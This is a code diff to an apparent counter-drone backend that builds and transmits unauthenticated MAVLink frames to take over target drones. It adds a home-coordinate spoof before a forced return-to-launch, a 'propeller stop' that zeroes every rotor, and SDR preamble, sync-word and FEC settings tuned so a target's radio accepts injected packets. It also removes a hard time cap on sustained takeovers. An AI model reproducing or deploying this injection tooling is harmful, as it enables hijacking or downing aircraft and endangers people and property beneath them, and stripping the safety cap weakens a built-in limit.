@@ -1480,10 +1480,27 @@ class DeployPayloadBody(BaseModel):
     broadcast: bool = False
     arm_token: Optional[str] = None  # required for CRITICAL severity or broadcast
     # Only meaningful for sustained payloads (PL-011 maneuver takeover). The
-    # operator-set engagement window; server-side clamped to the payload's
-    # max_duration_s hard cap regardless of what is sent. Ignored for one-shot
-    # payloads.
+    # operator-set engagement window, honored verbatim (commander directive: NO
+    # artificial hard cap). Ignored for one-shot payloads. Pair with
+    # continuous=True to run the controlled-landing until the operator stops it.
     duration_s: Optional[float] = None
+    # Sustained payloads only (PL-011): run continuous-until-stop instead of a
+    # fixed window. The kill-switch (EMERGENCY ABORT / tx_halt / range-auth-off)
+    # and the neutral-release burst are unchanged. Ignored for one-shot payloads.
+    continuous: bool = False
+    # PL-008 RTH HOME-SPOOF only: the FALSE home coordinates injected via
+    # DO_SET_HOME before the RTH trigger. Validated to valid geographic ranges
+    # (lat -90..90, lon -180..180, finite alt in metres) — no restriction beyond
+    # a valid coordinate. Ignored by every other payload. (ge/le reject NaN;
+    # allow_inf_nan=False rejects inf/NaN on the unbounded altitude.)
+    spoof_lat: Optional[float] = Field(None, ge=-90.0, le=90.0, allow_inf_nan=False)
+    spoof_lon: Optional[float] = Field(None, ge=-180.0, le=180.0, allow_inf_nan=False)
+    spoof_alt: Optional[float] = Field(None, allow_inf_nan=False)
+    # PL-005 PROPELLER STOP only: how many rotors to iterate DO_MOTOR_TEST
+    # (throttle=0) across. Operator-settable within the real airframe range
+    # [1, 8]; ignored by every other payload. Defaults to 4 (quadrotor) in the
+    # builder when omitted.
+    motor_count: Optional[int] = Field(None, ge=1, le=8)
     # Honesty acknowledgement for sustained RC-override: an operator asserting
     # the target is a legacy/unencrypted-MAVLink craft. Not a substitute for the
     # backend's own protocol check — an encrypted/FHSS protocol is refused
@@ -1631,6 +1648,16 @@ class MavlinkSdrInjectBody(BaseModel):
     deviation_hz: float = Field(MAVLINK_SDR_INJECT_DEFAULT_DEVIATION_HZ, gt=0)
     bt: float = Field(MAVLINK_SDR_INJECT_DEFAULT_BT, gt=0, le=1.0)
     bit_order: str = Field("msb", pattern="^(msb|lsb)$")
+    # Operator-settable on-air framing — match these to the TARGET link's actual
+    # PHY (measured from a capture). preamble/sync_word are given as hex; fec
+    # toggles the extended Golay(24,12) payload FEC that SiK/RFD900 use. HONEST
+    # SCOPE: setting these to the target's real values RAISES the probability its
+    # packet handler accepts the burst; it does NOT guarantee decode (whitening/
+    # interleaving/bit-order mismatches still fail it). Non-empty, bounded length,
+    # validated hex (1..64 bytes) so a bogus value can't produce a giant burst.
+    preamble_hex: str = Field("AAAAAAAA", pattern="^(?:[0-9a-fA-F]{2}){1,64}$")
+    sync_word_hex: str = Field("2DD4", pattern="^(?:[0-9a-fA-F]{2}){1,64}$")
+    fec: str = Field("none", pattern="^(none|golay)$")
     tx_gain: int = Field(20, ge=0, le=47)
     # An unauthenticated command is typically sent several times to survive
     # collisions on the target link. Commander directive: NO artificial cap —
@@ -5145,7 +5172,23 @@ async def deploy_payload(body: DeployPayloadBody,
     # so always pass them through — calling builder(seq=0) alone previously
     # raised TypeError for every payload except PL-010 (missing required
     # positional target_sys), which FastAPI surfaced as an unhandled 500.
-    frame = builder(target_sys, target_comp, 0)
+    #
+    # Per-payload operator parameters are threaded to the builders that accept
+    # them (kwargs, so unrelated builders are untouched):
+    #   * PL-008 RTH HOME-SPOOF: the injected FALSE home coordinates. The builder
+    #     emits DO_SET_HOME(spoof coords) THEN the NAV_RETURN_TO_LAUNCH trigger.
+    #   * PL-005 PROPELLER STOP: motor_count => iterate DO_MOTOR_TEST across ALL
+    #     rotors (not just #1). Clamped to the real airframe range in the builder.
+    if body.payload_id == "PL-008":
+        frame = builder(target_sys, target_comp, 0,
+                        lat=body.spoof_lat if body.spoof_lat is not None else 0.0,
+                        lon=body.spoof_lon if body.spoof_lon is not None else 0.0,
+                        alt=body.spoof_alt if body.spoof_alt is not None else 0.0)
+    elif body.payload_id == "PL-005":
+        frame = builder(target_sys, target_comp, 0,
+                        motor_count=body.motor_count if body.motor_count is not None else 4)
+    else:
+        frame = builder(target_sys, target_comp, 0)
     # SECURITY/RELIABILITY: request_id correlates this specific deploy to the
     # tx_ack the bridge sends back after its real serial write — see
     # _handle_tx_ack / rf-bridge/mavlink_bridge.py. Nothing here is marked
@@ -5178,11 +5221,19 @@ async def deploy_payload(body: DeployPayloadBody,
     # for a bounded time and to abort immediately on EMERGENCY ABORT.
     takeover_duration_s = None
     if getattr(spec, "sustained", False):
+        # Commander directive: the operator-set window is honored VERBATIM — NO
+        # artificial hard cap (the earlier min(requested, spec.max_duration_s)
+        # clamp is removed). continuous=True runs the controlled landing until
+        # the operator stops it. The real safety is the per-frame kill-switch
+        # (EMERGENCY ABORT / tx_halt / range-auth-off) plus the neutral-release
+        # burst, enforced in field-bridge/mavlink_takeover.py — not a timer.
         requested = body.duration_s if body.duration_s is not None else (spec.duration_ms / 1000.0)
-        takeover_duration_s = max(0.0, min(float(requested), spec.max_duration_s))
+        takeover_duration_s = max(0.0, float(requested))
         pkt["sustained"] = True
         pkt["mode"] = "rc_override_takeover"
         pkt["duration_s"] = takeover_duration_s
+        pkt["continuous"] = bool(body.continuous)
+        # Non-binding reference/default window only (no longer an enforced cap).
         pkt["max_duration_s"] = spec.max_duration_s
         pkt["rc_rate_hz"] = spec.rc_rate_hz
         pkt["target_component"] = target_comp
@@ -5269,8 +5320,10 @@ async def deploy_payload(body: DeployPayloadBody,
         "PAYLOAD",
         f"Requested {spec.name} ({spec.severity}) on "
         f"{'BROADCAST' if body.broadcast else detection.get('callsign','?')} "
-        + (f"— SUSTAINED controlled-landing, bounded {takeover_duration_s:.1f}s "
-           f"(cap {spec.max_duration_s:.0f}s), aborts on EMERGENCY ABORT "
+        + (f"— SUSTAINED controlled-landing, "
+           + ("CONTINUOUS-until-stop" if body.continuous
+              else f"operator-set {takeover_duration_s:.1f}s window (no artificial cap)")
+           + ", aborts on EMERGENCY ABORT "
            if takeover_duration_s is not None else "")
         + f"— awaiting bridge TX confirmation (request {request_id})",
         meta={"payload_id": spec.id, "packet_id": pkt["id"], "broadcast": body.broadcast,
@@ -5885,7 +5938,8 @@ async def deploy_mavlink_sdr_inject(body: MavlinkSdrInjectBody,
               "target_detection_id": body.target_detection_id, "target_system": target_sys,
               "center_freq_mhz": body.center_freq_mhz, "air_rate_bps": body.air_rate_bps,
               "deviation_hz": body.deviation_hz, "bt": body.bt, "bit_order": body.bit_order,
-              "repeat": body.repeat, "tx_gain": body.tx_gain,
+              "preamble_hex": body.preamble_hex.upper(), "sync_word_hex": body.sync_word_hex.upper(),
+              "fec": body.fec, "repeat": body.repeat, "tx_gain": body.tx_gain,
               "frame_hex": frame.hex().upper(), "decoded": describe_packet(frame)},
         actor=user["email"],
     )
@@ -5901,6 +5955,9 @@ async def deploy_mavlink_sdr_inject(body: MavlinkSdrInjectBody,
         "deviation_hz": body.deviation_hz,
         "bt": body.bt,
         "bit_order": body.bit_order,
+        "preamble_hex": body.preamble_hex,
+        "sync_word_hex": body.sync_word_hex,
+        "fec": body.fec,
         "repeat": body.repeat,
         "continuous": body.continuous,
         "tx_gain": body.tx_gain,
